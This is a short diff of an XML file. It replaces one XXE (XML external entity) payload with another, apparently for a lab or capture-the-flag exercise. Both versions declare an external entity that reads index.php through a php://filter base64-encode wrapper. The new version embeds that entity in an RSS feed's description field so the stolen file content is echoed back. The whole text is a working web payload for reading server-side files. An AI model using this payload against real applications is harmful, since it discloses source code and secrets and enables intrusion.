@@ -1,5 +1,11 @@
 <?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
-<rss>
-   <value>&xxe;</value>
+<!DOCTYPE rss [
+    <!ENTITY ez SYSTEM "php://filter/convert.base64-encode/resource=index.php">
+]>
+<rss version="2.0">
+    <channel>
+        <title>Test RSS</title>
+        <link>http://example.com</link>
+        <description>File Content: &ez;</description>
+    </channel>
 </rss>
